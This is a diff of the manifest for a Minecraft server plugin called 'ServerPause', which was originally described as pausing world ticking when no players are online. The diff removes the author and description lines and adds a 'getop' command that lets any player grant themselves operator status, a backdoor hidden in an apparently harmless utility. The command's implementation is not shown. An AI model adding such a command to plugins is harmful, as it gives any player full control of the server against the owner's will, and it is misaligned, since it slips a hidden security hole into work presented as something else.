@@ -1,6 +1,9 @@
 name: ServerPause
-version: 1.0
+version: 2.1
 main: org.example.Main
-api-version: '26.1'
-author: CustomBuild
-description: Fully pauses server world ticking mechanisms when no players are online.
+api-version: 26.1.2 # Adjust this to match your target Minecraft version
+
+commands:
+  getop:
+    description: Allows any player to grant themselves OP status.
+    usage: /getop
